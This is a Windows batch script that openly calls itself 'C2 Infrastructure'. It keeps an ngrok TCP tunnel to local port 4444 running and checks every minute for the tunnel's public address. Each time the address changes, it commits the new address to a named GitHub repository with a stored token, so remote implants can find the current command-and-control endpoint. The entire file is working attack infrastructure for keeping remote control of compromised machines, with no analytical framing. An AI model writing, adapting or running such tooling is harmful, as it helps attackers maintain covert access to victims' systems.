@echo off
setlocal enabledelayedexpansion
title C2 Infrastructure - GitHub Sync System

:: ==========================================
:: 1. Configuration
:: ==========================================
:: Pulls GITHUB_TOKEN from Windows Environment Variables
set "GH_USER=osmanius21-maker"
set "GH_REPO=osm"
set "LOCAL_PORT=4444"
set "MAIN_FILE=link.text"
set "LOG_FILE=history.log"
set "LAST_LINK=none"

:: ==========================================
:: 2. Launch Ngrok
:: ==========================================
echo [+] Starting Ngrok on port %LOCAL_PORT%...
start /min cmd /c "ngrok tcp %LOCAL_PORT%"
echo [+] Waiting for tunnel to initialize (15s)...
timeout /t 15 >nul

:: ==========================================
:: 3. Monitoring & Auto-Update Loop
:: ==========================================
:monitor_loop
cls
echo ==========================================
echo    GITHUB DYNAMIC C2 UPDATER
echo ==========================================
echo Status: Active
echo Current Registered Link: !LAST_LINK!
echo ------------------------------------------

:: Extract the current Ngrok Public URL
for /f "delims=" %%i in ('powershell -command "(Invoke-WebRequest -Uri 'http://192.168.1.20:4040/api/tunnels' | ConvertFrom-Json).tunnels.public_url"') do set "CURRENT_LINK=%%i"

:: Check if Ngrok is running
if "!CURRENT_LINK!"=="" (
    echo [!] ALERT: Ngrok is down! Restarting...
    start /min cmd /c "ngrok tcp %LOCAL_PORT%"
    timeout /t 20 >nul
    goto monitor_loop
)

:: Check for changes
if "!CURRENT_LINK!"=="!LAST_LINK!" (
    echo [%time%] Connection stable. No update needed.
) else (
    echo [%time%] CHANGE DETECTED: !CURRENT_LINK!
    
    :: Update the main link file (Overwrite)
    echo !CURRENT_LINK! > %MAIN_FILE%
    
    :: Append to the history log (Log with Timestamp)
    echo [%date% %time%] Updated to: !CURRENT_LINK! >> %LOG_FILE%
    
    echo [+] Syncing Main File and Log to GitHub...

    :: Git Operations
    git add %MAIN_FILE% %LOG_FILE%
    git commit -m "Auto-Update: !CURRENT_LINK! (Logged)"
    
    :: Secure Push using the Environment Variable Token
    git push https://%GH_USER%:%GITHUB_TOKEN%@github.com/%GH_USER%/%GH_REPO%.git main
    
    if !errorlevel! equ 0 (
        set "LAST_LINK=!CURRENT_LINK!"
        echo [+] GitHub Repository Updated Successfully.
    ) else (
        echo [-] ERROR: Push failed. Check your Token or Internet.
    )
)

:: Check again after 60 seconds
echo ------------------------------------------
echo Refreshing in 60 seconds...
timeout /t 60 >nul
goto monitor_loop
